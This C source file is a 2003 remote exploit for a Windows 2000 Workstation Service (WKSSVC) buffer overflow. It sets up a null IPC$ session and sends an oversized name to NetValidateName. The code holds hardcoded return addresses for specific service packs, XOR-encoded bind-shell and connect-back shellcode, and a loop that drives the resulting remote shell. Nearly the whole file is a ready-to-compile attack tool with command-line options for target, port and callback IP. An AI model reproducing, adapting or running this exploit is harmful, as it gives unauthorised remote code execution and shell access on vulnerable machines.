/*
 *  Author: snooq [http://www.angelfire.com/linux/snooq/]        
 *  Date: 13 November 2003  
 *
 *  Another public version of the 'exploit'.... =p
 *  Tested against Win2k only... 
 *
 *  This code relies on getopt... just grab any decent one 
 *  should work fine...
 *
 *  Use at your very own risk.. 
 *  I've not tested it thouroughly...Any bug report is 
 *  very much appreciated....  =)
 *                                                              
 *  Greetz:                                                      
 *  # jf, eugene, nam, wenbin...                                 
 *  # valmont aka airvirus, lw.......
 *  # alan..(thanks for finding me the 'players'..)  
 *  # GOD of ZION....
 *  # Ey4s, thanks for ur code.(it came quite handy to me)
 *  # .......... 
 */

#pragma comment (lib,"ws2_32")
#pragma comment (lib,"msvcrt")
#pragma comment (lib,"mpr")

#include <winsock2.h>
#include <windows.h>
#include <process.h>
#include <stdlib.h>
#include <stdio.h>
#include <lm.h>

#define NOP	0x90
#define PORT	24876
#define KEY	0x99999999

#define ALIGN		1	// Between 0 ~ 3
#define TARGET		1
#define INTERVAL	3
#define TIME_OUT	20
#define KEY_OFFSET	14
#define PORT_OFFSET_1	175
#define PORT_OFFSET_2	231
#define IP_OFFSET	236
#define SC_OFFSET	20	// Gap for some NOPs...		
#define RET_SIZE	2026	// Big enuff to take EIP... ;)

#define SC_SIZE_1	sizeof(bindport)
#define SC_SIZE_2	sizeof(connback)

#define BSIZE	2600
#define SSIZE	128

extern char getopt(int,char **,char*);
extern char *optarg;
static int alarm_fired=0;

HMODULE hMod;
FARPROC fxn;
HANDLE t1, t2;

char buff[BSIZE];

struct {
	char *os;
	long jmpesp;
	char *dll;
}

targets[] = {
	{
		"Window 2000 (en) SP4",
		0x77e14c29,
		"user32.dll 5.0.2195.6688" 
	},
	{
		"Window 2000 (en) SP1",
		0x77e3cb4c,
		"user32.dll 5.0.2195.1600" 
	}
}, v;

/*
 *  Shellcode were shamelessly ripped from Ey4's...
 */

char bindport[]=
      "\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x66\x01\x80\x34\x0A\x99\xE2\xFA"
      "\xEB\x05\xE8\xEB\xFF\xFF\xFF" 
      "\x70\x99\x98\x99\x99\xC3\x21\x95\x69\x64\xE6\x12\x99\x12\xE9\x85"
      "\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x9A\x6A\x12\xEF\xE1\x9A\x6A"
      "\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6\x9A"
      "\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D\xDC"
      "\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A\x58"
      "\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58\x12"
      "\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0\x71"
      "\xE5\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41\xF3"
      "\x9D\xC0\x71\xF0\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B\x66"
      "\xCE\x69\x12\x41\x5E\x9E\x9B\x99\x9E\x24\xAA\x59\x10\xDE\x9D\xF3"
      "\x89\xCE\xCA\x66\xCE\x6D\xF3\x98\xCA\x66\xCE\x61\xC9\xC9\xCA\x66"
      "\xCE\x65\x1A\x75\xDD\x12\x6D\xAA\x42\xF3\x89\xC0\x10\x85\x17\x7B"
      "\x62\x10\xDF\xA1\x10\xDF\xA5\x10\xDF\xD9\x5E\xDF\xB5\x98\x98\x99"
      "\x99\x14\xDE\x89\xC9\xCF\xCA\xCA\xCA\xF3\x98\xCA\xCA\x5E\xDE\xA5"
      "\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9\xCA\x66\xCE\x7D\xC9\x66\xCE\x71"
      "\xAA\x59\x35\x1C\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32"
      "\x7B\x77\xAA\x59\x5A\x71\x62\x67\x66\x66\xDE\xFC\xED\xC9\xEB\xF6"
      "\xFA\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9"
      "\xEB\xF6\xFA\xFC\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED\xC9\xEB\xF6\xFA"
      "\xFC\xEA\xEA\x99\xD5\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0\xD8"
      "\x99\xEE\xEA\xAB\xC6\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA\xF2\xFC"
      "\xED\xD8\x99\xFB\xF0\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8"
      "\xFA\xFA\xFC\xE9\xED\x99";

char connback[]=
      "\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x4F\x01\x80\x34\x0A\x99\xE2\xFA"
      "\xEB\x05\xE8\xEB\xFF\xFF\xFF"
      "\x70\x6D\x99\x99\x99\xC3\x21\x95\x69\x64\xE6\x12\x99\x12\xE9\x85"
      "\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x9A\x6A\x12\xEF\xE1\x9A\x6A"
      "\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6\x9A"
      "\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D\xDC"
      "\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A\x58"
      "\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58\x12"
      "\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0\x71"
      "\xE9\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41\xF3"
      "\x9B\xC0\x71\xC4\x99\x99\x99\x1A\x75\xDD\x12\x6D\xF3\x89\xC0\x10"
      "\x9D\x17\x7B\x62\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B\x66\xCE\x61\x12"
      "\x41\x10\xC7\xA1\x10\xC7\xA5\x10\xC7\xD9\xFF\x5E\xDF\xB5\x98\x98"
      "\x14\xDE\x89\xC9\xCF\xAA\x59\xC9\xC9\xC9\xF3\x98\xC9\xC9\x14\xCE"
      "\xA5\x5E\x9B\xFA\xF4\xFD\x99\xCB\xC9\x66\xCE\x75\x5E\x9E\x9B\x99"
      "\x9E\x24\x5E\xDE\x9D\xE6\x99\x99\x98\xF3\x89\xCE\xCA\x66\xCE\x65"
      "\xC9\x66\xCE\x69\xAA\x59\x35\x1C\x59\xEC\x60\xC8\xCB\xCF\xCA\x66"
      "\x4B\xC3\xC0\x32\x7B\x77\xAA\x59\x5A\x71\x9E\x66\x66\x66\xDE\xFC"
      "\xED\xC9\xEB\xF6\xFA\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC"
      "\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED"
      "\xC9\xEB\xF6\xFA\xFC\xEA\xEA\x99\xD5\xF6\xF8\xFD\xD5\xF0\xFB\xEB"
      "\xF8\xEB\xE0\xD8\x99\xEE\xEA\xAB\xC6\xAA\xAB\x99\xCE\xCA\xD8\xCA"
      "\xF6\xFA\xF2\xFC\xED\xD8\x99\xFA\xF6\xF7\xF7\xFC\xFA\xED\x99";

void err_exit(char *s) {
	printf("%s\n",s);
	exit(0);
}

/* 
 * Ripped from TESO code and modifed by ey4s for win32 
 * and... lamer quoted it wholesale here..... =p
 */

void doshell(int sock) {
    int l;
    char buf[512];
    struct timeval time;
    unsigned long ul[2];

    time.tv_sec=1;
    time.tv_usec=0;

    while (1) {

        ul[0]=1;
        ul[1]=sock;

        l=select(0,(fd_set *)&ul,NULL,NULL,&time);
        if(l==1) {
            l=recv(sock,buf,sizeof(buf),0);
            if (l<=0) {
                err_exit("-> Connection closed...\n");
            }
            l=write(1,buf,l);
            if (l<=0) {
                err_exit("-> Connection closed...\n");
            }
        }
        else {
            l=read(0,buf,sizeof(buf));
            if (l<=0) {
                err_exit("-> Connection closed...\n");
            }
            l=send(sock,buf,l,0);
            if (l<=0) {
                err_exit("-> Connection closed...\n");
            }
        }

    }
}

void changeip(char *ip) {
	char *ptr;
	ptr=connback+IP_OFFSET;
	/* Assume Little-Endianess.... */
	*((long *)ptr)=inet_addr(ip)^KEY;
}

void changeport(char *code, int port, int offset) {
	char *ptr;
	ptr=code+offset;
	port^=KEY;
	/* Assume Little-Endianess.... */
	*ptr++=(char)((port>>8)&0xff);
	*ptr++=(char)(port&0xff);
}

void banner() {
	printf("\nWKSSVC Remote Exploit By Snooq [jinyean@hotmail.com]\n\n");
}

void usage(char *s) {
	banner();
	printf("Usage: %s [options]\n",s);
	printf("\t-r\tSize of 'return addresses'\n");
	printf("\t-a\tAlignment size [0~3]\n");
	printf("\t-p\tPort to bind shell to (in 'connecting' mode), or\n");
	printf("\t\tPort for shell to connect back (in 'listening' mode)\n");
	printf("\t-s\tShellcode offset from the return address\n");
	printf("\t-h\tTarget's IP\n");
	printf("\t-t\tTarget types. ( -H for more info )\n");
	printf("\t-H\tShow list of possible targets\n");
	printf("\t-l\tListening for shell connecting\n");
	printf("\t\tback to port specified by '-s' switch\n");
	printf("\t-i\tIP for shell to connect back\n");
	printf("\t-I\tTime interval between each trial ('connecting' mode only)\n");
	printf("\t-T\tTime out (in number of seconds)\n\n");
	printf("\tNotes:\n\t======\n\t'-h' is mandatory\n");
	printf("\t'-i' is mandatory if '-l' is specified\n\n");
	exit(0);
}

void showtargets() {
	int i;
	banner();
	printf("Possible targets are:\n");
	printf("=====================\n");
	for (i=0;i<sizeof(targets)/sizeof(v);i++) {
		printf("%d) %s",i+1,targets[i].os);
		printf(" --> 0x%08x (%s)\n",targets[i].jmpesp,targets[i].dll);
	}
	exit(0);
}

void sendstr(char *host) {

	WCHAR wStr[128];
	char ipc[128], hStr[128];

	DWORD ret;
	NETRESOURCE NET;

	hMod=LoadLibrary("netapi32.dll");
	fxn=GetProcAddress(hMod,"NetValidateName");

	_snprintf(ipc,127,"\\\\%s\\ipc$",host);
	_snprintf(hStr,127,"\\\\%s",host);
    	MultiByteToWideChar(CP_ACP,0,hStr,strlen(hStr)+1,wStr,sizeof(wStr)/sizeof(wStr[0]));

	NET.lpLocalName = NULL;
	NET.lpProvider = NULL;
	NET.dwType = RESOURCETYPE_ANY;
	NET.lpRemoteName = (char*)&ipc;

	printf("-> Setting up $IPC session...(aka 'null session')\n");
	ret=WNetAddConnection2(&NET,"","",0);

	if (ret!=ERROR_SUCCESS) { err_exit("-> Couldn't establish IPC$ connection..."); }
	else printf("-> IPC$ session setup successfully...\n");

	printf("-> Sending exploit string...\n");

	ret=fxn((LPCWSTR)wStr,buff,NULL,NULL,0);

}

VOID CALLBACK alrm_bell(HWND hwnd, UINT uMsg, UINT idEvent, DWORD dwTime ) {
	err_exit("-> I give up...dude.....\n");
}

void setalarm(int timeout) {

	MSG msg = { 0, 0, 0, 0 };
	SetTimer(0, 0, (timeout*1000), (TIMERPROC)alrm_bell);
 
    	while(!alarm_fired) {
        	if (GetMessage(&msg, 0, 0, 0) ) {
			if (msg.message == WM_TIMER) printf("-> WM_TIMER received...\n");
			DispatchMessage(&msg);
        	}
	}	

}

void resetalarm() {
	if (TerminateThread(t2,0)==0) {
		err_exit("-> Failed to reset alarm...");
	}
}

void do_send(char *host,int timeout) {
	t1=_beginthread(sendstr,0,host);
	if (t1==0) { err_exit("-> Failed to send exploit string..."); }
	t2=_beginthread(setalarm,0,timeout);
	if (t1==0) { err_exit("-> Failed to set alarm clock..."); }
}

int main(int argc, char *argv[]) {

	char opt;
	char *host, *ptr, *ip="";
	struct sockaddr_in sockadd;
	int i, i_len, ok=0, mode=0, flag=0;
	int align=ALIGN, retsize=RET_SIZE, sc_offset=SC_OFFSET;
	int target=TARGET, scsize=SC_SIZE_1, port=PORT;
	int timeout=TIME_OUT, interval=INTERVAL;
	long retaddr;

	WSADATA wsd;
	SOCKET s1, s2;

	if (argc<2) { usage(argv[0]); }

	while ((opt=getopt(argc,argv,"a:i:I:r:s:h:t:T:p:Hl"))!=EOF) {
		switch(opt) {
			case 'a':
			align=atoi(optarg);
			break;

			case 'I':
			interval=atoi(optarg);
			break;

			case 'T':
			timeout=atoi(optarg);
			break;

			case 't':
			target=atoi(optarg);
			retaddr=targets[target-1].jmpesp;
			break;

			case 'i':
			ip=optarg;
			changeip(ip);
			break;

			case 'l':
			mode=1;
			scsize=SC_SIZE_2;
			break;

			case 'r':
			retsize=atoi(optarg);
			break;

			case 's':
			sc_offset=atoi(optarg);
			break;
			
			case 'h':
			ok=1;
			host=optarg;
			sockadd.sin_addr.s_addr=inet_addr(optarg);
			break;

			case 'p':
			port=atoi(optarg);
			break;

			case 'H':
			showtargets();
			break;

			default:
			usage(argv[0]);
			break;
		}
	}

	if (!ok || (mode&&((strcmp(ip,"")==0)))) { usage(argv[0]); }

	memset(buff,NOP,BSIZE);

	ptr=buff+align;
	for(i=0;i<retsize;i+=4) {
		*((long *)ptr)=retaddr;
		ptr+=4;
	}

	if (WSAStartup(MAKEWORD(1,1),&wsd)!=0) {
		err_exit("-> WSAStartup error....");
	}

	if ((s1=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0) {
		err_exit("-> socket error");
	}
	sockadd.sin_family=AF_INET;
	sockadd.sin_port=htons(port);

	ptr=buff+retsize+sc_offset;

	if (BSIZE<(retsize+sc_offset+scsize)) err_exit("-> Bad 'sc_offset'..");

	banner();

	if (mode) {

		printf("-> 'Listening' mode...( port: %d )\n",port);

	    	changeport(connback, port, PORT_OFFSET_2);
	    	for(i=0;i<scsize;i++) { *ptr++=connback[i]; }

		do_send(host,timeout);
		Sleep(1000);

		sockadd.sin_addr.s_addr=htonl(INADDR_ANY);
		i_len=sizeof(sockadd);

		if (bind(s1,(struct sockaddr *)&sockadd,i_len)<0) {
			err_exit("-> bind() error");
		}

		if (listen(s1,0)<0) {
			err_exit("-> listen() error");
		}

		printf("-> Waiting for connection...\n");

		s2=accept(s1,(struct sockaddr *)&sockadd,&i_len);

		if (s2<0) {
			err_exit("-> accept() error");
		}

		printf("-> Connection from: %s\n\n",inet_ntoa(sockadd.sin_addr));

		resetalarm();
		doshell(s2);

	}
	else {

		printf("-> 'Connecting' mode...\n",port);

		changeport(bindport, port, PORT_OFFSET_1);
		for(i=0;i<scsize;i++) { *ptr++=bindport[i]; }

		do_send(host,timeout);
		Sleep(1000);

		printf("-> Will try connecting to shell now....\n");

		i=0;  
		while(!flag) {
			Sleep(interval*1000);
			if(connect(s1,(struct sockaddr *)&sockadd, sizeof(sockadd))<0) {
				printf("-> Trial #%d....\n",i++);
			}
			else { flag=1; }
		}

    		printf("-> Connecting to shell at %s:%d\n\n",inet_ntoa(sockadd.sin_addr),port);

		resetalarm();
		doshell(s1);

	}

	return 0;

}

